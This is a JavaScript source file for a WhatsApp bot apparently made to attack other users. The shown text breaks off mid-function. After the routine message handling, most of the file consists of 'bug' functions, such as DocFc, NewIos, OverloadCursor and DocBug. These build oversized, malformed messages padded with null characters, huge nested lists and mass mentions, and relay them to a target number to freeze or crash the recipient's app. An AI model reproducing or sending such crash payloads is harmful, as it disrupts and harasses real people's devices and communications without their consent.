require('../setting/config');

const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const ms = require("parse-ms");
const fetch = require("node-fetch");
const JsConfuser = require('js-confuser');
const moment = require("moment-timezone");
const { spawn, exec, execSync } = require('child_process');

const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia, downloadContentFromMessage } = require("@whiskeysockets/baileys");

module.exports = cici_syantik = async (cici_syantik, m, chatUpdate, store) => {
try {
// Message type handling
const body = (
m.mtype === "conversation" ? m.message.conversation :
m.mtype === "imageMessage" ? m.message.imageMessage.caption :
m.mtype === "videoMessage" ? m.message.videoMessage.caption :
m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
);

const sender = m.key.fromMe
? cici_syantik.user.id.split(":")[0] + "@s.whatsapp.net" || cici_syantik.user.id
: m.key.participant || m.key.remoteJid;

const senderNumber = sender.split('@')[0];
const budy = (typeof m.text === 'string' ? m.text : '');
const prefa = ["", "!", ".", ",", "🐤", "🗿"];
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.';
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");

// Database
const kontributor = JSON.parse(fs.readFileSync('./start/lib/database/owner.json'));

const botNumber = await cici_syantik.decodeJid(cici_syantik.user.id);
const Access = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCmd = body.startsWith(prefix);
const command = body.slice(1).trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const pushname = m.pushName || "No Name";
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const mime = (quoted.msg || quoted).mimetype || '';
const qmsg = (quoted.msg || quoted);
const isMedia = /image|video|sticker|audio/.test(mime);

// Group function
const groupMetadata = isGroup ? await cici_syantik.groupMetadata(m.chat).catch((e) => {}) : "";
const groupOwner = isGroup ? groupMetadata.owner : "";
const groupName = m.isGroup ? groupMetadata.subject : "";
const participants = isGroup ? await groupMetadata.participants : "";
const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.id) : "";
const groupMembers = isGroup ? groupMetadata.participants : "";
const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;

// Function
const { smsg, sendGmail, formatSize, isUrl, generateMessageTag, getBuffer, getSizeMedia, runtime, fetchJson, sleep } = require('./lib/myfunction');
    
const _prem = require("./lib/premium");
const isPremium = Access ? true : _prem.checkPremiumUser(m.sender);

// Foto
let cihuy = fs.readFileSync('./start/lib/media/cicitzy.jpg')
// Time
const time = moment.tz("Asia/Makassar").format("HH:mm:ss");


// Console log
if (m.message) {
console.log('\x1b[30m--------------------\x1b[0m');
console.log(chalk.bgHex("#e74c3c").bold(`▢ New Message`));
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Tanggal: ${new Date().toLocaleString()} \n` +
`   ⌬ Pesan: ${m.body || m.mtype} \n` +
`   ⌬ Pengirim: ${m.pushname} \n` +
`   ⌬ JID: ${senderNumber}`
)
);
if (m.isGroup) {
console.log(
chalk.bgHex("#00FF00").black(
`   ⌬ Grup: ${groupName} \n` +
`   ⌬ GroupJid: ${m.chat}`
)
);
}
console.log();
}
    
let resize = async (image, width, height) => {
    let oyy = await jimp.read(image)
    let kiyomasa = await oyy.resize(width, height).getBufferAsync(jimp.MIME_JPEG)
    return kiyomasa
}

const RC = fs.readFileSync('./start/lib/media/cicitzy.jpg')
const cici_syantikreply = async (teks) => {
return cici_syantik.sendMessage(m.chat, {
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: true,
renderLargerThumbnail: false,
title: `viléstâ (¢)`,
body: `🔴 čicítzy viléstâ (¢)`,
previewType: "VIDEO",
thumbnail: RC,
sourceUrl: `https://whatsapp.com/channel/0029Vb30zLXLo4hWVPChF41q`,
mediaUrl: `https://img1.pixhost.to/images/5120/589174536_yanzhosting.jpg`
}
},
text: teks
}, {
quoted: m
})
}

const bugres = 'viléstâ (¢) sukses war'
const cicitzy = 'bug ini tidak akan berhenti, jika kamu tidak melepas sumber aktif nya'

// function bug //
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "cici_syantik" + "\u0000".repeat(900000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await cici_syantik.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
async function InvisiPayload(target) {
      let sections = [];

      for (let i = 0; i < 100000; i++) {
        let largeText = "𐎟💦⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐈𝐍𝐕𝐈𝐒𝐈͢𝐏𝐀𝐘𝐋𝐎𝐀𝐃͢ 🐉⃝⃝𐎟";

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let msg = generateWAMessageFromContent(
        target,
        {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: proto.Message.InteractiveMessage.create({
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: proto.Message.InteractiveMessage.Body.create({
                  text: "𐎟💦⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐈𝐍𝐕𝐈𝐒𝐈͢𝐏𝐀𝐘𝐋𝐎𝐀𝐃͢ 🐉⃝⃝𐎟",
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                  buttonParamsJson: "JSON.stringify(listMessage)",
                  subtitle: "Testing Immediate Force Close",
                  hasMediaAttachment: false, // No media to focus purely on data overload
                }),
                nativeFlowMessage:
                  proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "payment_method",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "call_permission_request",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "single_select",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "JSON.stringify(listMessage)",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                      {
                        name: "mpm",
                        buttonParamsJson: "{}",
                      },
                    ],
                  }),
              }),
            },
          },
        },
        { userJid: target }
      );

      await cici_syantik.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
      });
    }
    
async function MSGSPAM(target) {
    let Msg = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: ["13135550002@s.whastapp.net"],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐌𝐒𝐆𝐒͢𝐏𝐀𝐌͢ 🐉⃝⃝𐎟",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await cici_syantik.relayMessage(target, Msg, {
      participant: { jid: target },
    })
  }
  
async function DocFc(target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈͢𝐓𝐙𝐘𒁂𝐃𝐎𝐂͢𝐅𝐂͢ 🐉⃝⃝𐎟" + "ꦾ".repeat(4500),
listType: 2,
singleSelectReply: {
    selectedRowId: "🔪"
},
contextInfo: {
stanzaId: cici_syantik.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target, "13135550002@s.whatsapp.net"],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐃𝐎𝐂͢𝐅𝐂͢ 🐉⃝⃝𐎟",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "Wanna Die ? Huh !"
                    },
                    contentText: "I Wanna Die With You \"😮‍💨\"",
                    footerText: "© cici_syantik",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "Agler Forger gen 9"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
entryPointConversionSource: "wangcap",
entryPointConversionApp: "wangcap",
actionLink: {
url: "t.me/cicitzy_wangsaff",
buttonTitle: "trash"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "cici_syantik",
parentGroupJid: "combine",
trustBannerType: "unexpected",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "𑲭𑲭 cici_syantik ~ \"Dev\" ⚔️ ",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© vilesta",
sourceUrl: "se me?",
sourceId: "vilesta",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "burst",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "trash"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363321780343299@newsletter",
serverMessageId: 1,
newsletterName: `Crash Sletter ~ ${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "crash"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "INITIATED_BY_USER"
},
messageContextInfo: {
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
}),
},
}
}
}

await cici_syantik.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
console.log("")
}

async function NewIos(target, Ptcp = true) {
cici_syantik.relayMessage(
    target,
    {
        extendedTextMessage: {
            text: `𑲭𑲭𐎟🩸⃝⃝𝐂𝐈𝐂𝐈͢𝐓𝐙𝐘𒁂𝐍𝐄𝐖͢𝐈𝐎𝐒͢ 🐉⃝⃝𐎟 ${'ꦾ'.repeat(103000)} ${'@13135550002'.repeat(25000)}`,
            contextInfo: {
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 15000 }, () => `13135550002${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
                ],
                stanzaId: "1234567890ABCDEF",
                participant: "13135550002@s.whatsapp.net",
                quotedMessage: {
                    callLogMesssage: {
                        isVideo: true,
                        callOutcome: "1",
                        durationSecs: "0",
                        callType: "REGULAR",
                        participants: [
                            {
                                jid: "13135550002@s.whatsapp.net",
                                callOutcome: "1"
                            }
                        ]
                    }
                },
                remoteJid: "13135550002@s.whastapp.net",
                conversionSource: "source_example",
                conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
                conversionDelaySeconds: 10,
                forwardingScore: 99999999,
                isForwarded: true,
                quotedAd: {
                    advertiserName: "Example Advertiser",
                    mediaType: "IMAGE",
                    caption: "This is an ad caption"
                },
                placeholderKey: {
                    remoteJid: "13135550002@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                },
                expiration: 86400,
                ephemeralSettingTimestamp: "1728090592378",
                ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
                externalAdReply: {
                    title: "𑲭𑲭𐎟🩸⃝⃝𝐂𝐈𝐂𝐈𝐓𝐙𝐘͢𝐕𝐈𝐋𝐄𝐒𝐓𝐀𒁂𝐍𝐄𝐖͢𝐈𝐎𝐒͢ 🐉⃝⃝𐎟 ",
                    body: `Ai To Crash ${'\0'.repeat(200)}`,
                    mediaType: "VIDEO",
                    renderLargerThumbnail: true,
                    previewType: "VIDEO",
                    sourceType: "x",
                    sourceId: "x",
                    sourceUrl: "https://www.facebook.com/WhastApp",
                    mediaUrl: "https://www.facebook.com/WhastApp",
                    containsAutoReply: true,
                    showAdAttribution: true,
                    ctwaClid: "ctwa_clid_example",
                    ref: "ref_example"
                },
                entryPointConversionSource: "entry_point_source_example",
                entryPointConversionApp: "entry_point_app_example",
                entryPointConversionDelaySeconds: 5,
                disappearingMode: {},
                actionLink: {
                    url: "https://www.facebook.com/WhatsApp"
                },
                groupSubject: "Example Group Subject",
                parentGroupJid: "13135550002@g.us",
                trustBannerType: "trust_banner_example",
                trustBannerAction: 1,
                isSampled: false,
                utm: {
                    utmSource: "utm_source_example",
                    utmCampaign: "utm_campaign_example"
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "13135550002@newsletter",
                    serverMessageId: 1,
                    newsletterName: "Meta Ai",
                    contentType: "UPDATE",
                    accessibilityText: "Meta Ai"
                },
                businessMessageForwardInfo: {
                    businessOwnerJid: "13135550002@s.whatsapp.net"
                },
                smbriyuCampaignId: "smb_riyu_campaign_id_example",
                smbServerCampaignId: "smb_server_campaign_id_example",
                dataSharingContext: {
                    showMmDisclosure: true
                }
            }
        }
    },
    Ptcp
        ? {
              participant: {
                  jid: target
              }
          }
        : {}
       
);
console.log("")
}

async function OverloadCursor(target, ptcp = true) {
  const virtex = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title:
            "🆘⃢⃝⃝⃝⃝⃝△𝐂𝐢𝐜𝐢𝐓𝐳𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨" + "ꦽ".repeat(16999),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🎭",
          },
          contextInfo: {
            virtexId: cici_syantik.generateMessageTag(),
            participant: "13135550002@s.whatsapp.net",
            mentionedJid: ["13135550002@s.whatsapp.net"],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                  fileName: "cici_syantik" + "\u0000".repeat(97770),
                  fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                  directPath:
                    "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1726867151",
                  contactVcard: true,
                },
                hasMediaAttachment: true,
                contentText: 'Hallo"',
                footerText: "🆘⃢⃝⃝⃝⃝⃝△𝐂𝐢𝐜𝐢𝐓𝐳𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "vilesta (¢)" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "vilesta (¢)" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                  {
                    buttonId: "\u0000".repeat(220000),
                    buttonText: {
                      displayText: "cici_syantik official" + "\u0000".repeat(1999),
                    },
                    type: 1,
                  },
                ],
                viewOnce: true,
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "13135550002@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            entryPointConversionSource: "❤️",
            entryPointConversionApp: "💛",
            actionLink: {
              url: "t.me/cici_syantik_Offc",
              buttonTitle: "🆘⃢⃝⃝⃝⃝⃝△𝐂𝐢𝐜𝐢𝐭𝐳𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatorDeviceJid: target,
              initiatedByMe: true,
            },
            groupSubject: "😼",
            parentGroupJid: "😽",
            trustBannerType: "😾",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {},
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: `@13135550002${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: "@13135550002".repeat(2999),
        },
        messageContextInfo: {
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
          }),
        },
      },
    },
  };
  let sections = [];
  for (let i = 0; i < 1; i++) {
    let largeText = "\u0000".repeat(11999);
    let deepNested = {
      title: `Section ${i + 1}`,
      highlight_label: `Highlight ${i + 1}`,
      rows: [
        {
          title: largeText,
          id: `\u0000`.repeat(999),
          subrows: [
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
              subsubrows: [
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
                {
                  title: `\u0000`.repeat(999),
                  id: `\u0000`.repeat(999),
                },
              ],
            },
            {
              title: `\u0000`.repeat(999),
              id: `\u0000`.repeat(999),
            },
          ],
        },
      ],
    };
    sections.push(deepNested);
  }
  let listMessage = {
    title: "𝙾𝚅𝙴𝚁𝙻𝙾𝙰𝙳",
    sections: sections,
  };
  let msg = generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
            },
            body: proto.Message.InteractiveMessage.Body.create({
              text: '🆘⃢⃝⃝⃝⃝⃝△𝐂𝐢𝐜𝐢𝐓𝐳𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨' + "ꦽ".repeat(29999),
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              buttonParamsJson: JSON.stringify(listMessage),
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              buttonParamsJson: JSON.stringify(listMessage),
              subtitle: "🆘⃢⃝⃝⃝⃝⃝△𝐂𝐢𝐜𝐢𝐓𝐳𝐲 🐉 𝐎𝐯𝐞𝐫𝐥𝐨𝐚𝐝 ⃢🧨⃝⃝𝐂𝐫𝐮𝐬𝐨𝐫⃢🧨" + "\u0000".repeat(9999),
              hasMediaAttachment: false,
            }),
            nativeFlowMessage:
              proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "{}",
                  },
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              }),
          }),
        },
      },
    }),
    { userJid: target }
  );
  await cici_syantik.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(``);
  await cici_syantik.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  await cici_syantik.relayMessage(target, messagePayload, {
    additionalNodes: virtex,
    participant: { jid: target },
  });
  console.log(``);
}
async function invc2(target, ptcp = true) {
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "🐉⃝⃞⃝⃞⃝⃞⃝⃞⃝⃞⃝⃞⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃞⃞⃞⃞⃞⃞⃞⃞⃞⃞⃞⏤𝐂𝐢𝐜𝐢𝐓𝐳𝐲͟͟͞͞𝐈𝐧𝐯𝐜⏤𝐕𝟑.𝟎.𝟎͟͟͞📵͞",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "cici_syantik"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await cici_syantik.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
 // end function //

 // FUNC BUG TEMBUS UI SISTEM 🔥
async function DocBug(target) {
 let virtex = "🐉⃝⃝𝐂𝐢𝐜𝐢𝐓𝐳𝐲͢𝐗 𝐃𝐨𝐜𝐁𝐮𝐠͟͟͞🐉";
   cici_syantik.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "🐉⃝⃝𝐂𝐢𝐜𝐢𝐓𝐳𝐲͢𝐗 𝐃𝐨𝐜𝐁𝐮𝐠͟͟͞🐉" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await cici_syantik.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `🐉⃝⃝𝐂𝐢𝐜𝐢𝐓𝐳𝐲͢𝐗 𝐋𝐨𝐜𝐚𝐁𝐮𝐠𝐬͟͟͞🚫`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🐉⃝⃝𝐂𝐢𝐜𝐢𝐓𝐳𝐲͢𝐗 𝐋𝐨𝐜𝐚𝐁𝐮𝐠𝐬͟͟͞🚫" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
